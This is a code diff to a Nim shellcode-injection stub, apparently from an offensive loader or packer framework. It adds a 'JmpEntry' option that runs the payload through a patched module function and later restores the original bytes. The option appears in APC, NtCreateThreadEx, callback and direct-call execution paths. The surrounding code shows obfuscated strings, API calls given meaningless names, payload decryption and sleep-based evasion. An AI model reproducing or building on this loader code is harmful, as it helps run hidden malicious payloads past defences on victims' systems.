@@ -124,6 +124,12 @@ let LocalInjectStub*  = """
         else:
             when defined(verbose):
                 echo obf("[+] NtWriteVirtualMemory - wrote bytes ") & fmt"{bytesWritten}"
+        
+        when defined(JmpEntry):
+            var newEntry: LPVOID
+            newEntry = prepEntry(-1, buffer, jmpMod, jmpFunc)
+            when defined(verbose):
+                echo obf("[*] New Entry Point: "), toHex(cast[HANDLE](newEntry))
 
         when defined(RX): # we need to decrypt earlier, because we cannot without WRITE perms
             when defined(sleepinbetween):
@@ -162,6 +168,9 @@ let LocalInjectStub*  = """
                     when defined(verbose):
                         echo obf("[-] Failed to find opcode for NtQueueApcThread")
             
+            when defined(JmpEntry):
+                buffer = newEntry
+
             let pfnAPC : PKNORMAL_ROUTINE = cast[PKNORMAL_ROUTINE](buffer)
             status = NtQueueApcThread(tHandle, pfnAPC, buffer, nil, nil)
             when defined(verbose):
@@ -177,11 +186,23 @@ let LocalInjectStub*  = """
             status = NtTestAlert()
             when defined(verbose):
                 echo obf("[*] NtTestAlert: "), toHex(status)
+            
+            when defined(JmpEntry):
+                Sleep(1000)
+                if(restoreBytes(-1, buffer)):
+                    when defined(verbose):
+                        echo obf("[*] Restored bytes!")
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to restore bytes!")
+
             return
 
 
         when defined(LocalCreateThread):
             var tHandle: HANDLE
+            when defined(JmpEntry):
+                buffer = newEntry
             when not defined(RX):
                 when defined(sleepinbetween):
                     HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
@@ -198,6 +219,14 @@ let LocalInjectStub*  = """
                     decryptLate()
                 status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,buffer,NULL, FALSE, 0, 0, 0, NULL)
                 NtWaitForSingleObject(tHandle, 0, nil)
+                when defined(JmpEntry):
+                    Sleep(1000)
+                    if(restoreBytes(-1, buffer)):
+                        when defined(verbose):
+                            echo obf("[*] Restored bytes!")
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to restore bytes!")
                 Wait()
                 status = zuatzuastdiasyy(tHandle)
                 status = zuatzuastdiasyy(pHandle)
@@ -225,6 +254,15 @@ let LocalInjectStub*  = """
                 nil, FALSE, 0, 0, 0, nil)
                 when defined(verbose):
                     echo obf("[*] NtCreateThreadEx: "), toHex(status)
+                when defined(JmpEntry):
+                    Sleep(1000)
+                    if(restoreBytes(-1, buffer)):
+                        when defined(verbose):
+                            echo obf("[*] Restored bytes!")
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to restore bytes!")
+                
                 # Somehow not working
                 #var TimeOut: LARGE_INTEGER = cast[LARGE_INTEGER](-1)
                 #NtWaitForSingleObject(-1, 0, &TimeOut)
@@ -241,6 +279,8 @@ let LocalInjectStub*  = """
             return
             
         when defined(Callback):
+            when defined(JmpEntry):
+                buffer = newEntry
             when not defined(RX):
                 when defined(sleepinbetween):
                     HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
@@ -248,8 +288,18 @@ let LocalInjectStub*  = """
                 ptrDecText = cast[ptr byte](buffer)
                 decryptLate()
             discard EnumCalendarInfoA(cast[CALINFO_ENUMPROCA](buffer),1,1,1)
+            when defined(JmpEntry):
+                Sleep(1000)
+                if(restoreBytes(-1, buffer)):
+                    when defined(verbose):
+                        echo obf("[*] Restored bytes!")
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to restore bytes!")
             Wait()
         else:
+            when defined(JmpEntry):
+                buffer = newEntry
             when not defined(RX):
                 when defined(sleepinbetween):
                     HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
@@ -258,6 +308,14 @@ let LocalInjectStub*  = """
                 decryptlate()
             let f = cast[proc(){.nimcall.}](buffer)
             f()
+            when defined(JmpEntry):
+                Sleep(1000)
+                if(restoreBytes(-1, buffer)):
+                    when defined(verbose):
+                        echo obf("[*] Restored bytes!")
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to restore bytes!")
             Wait()
 
     pwndem(enctext)
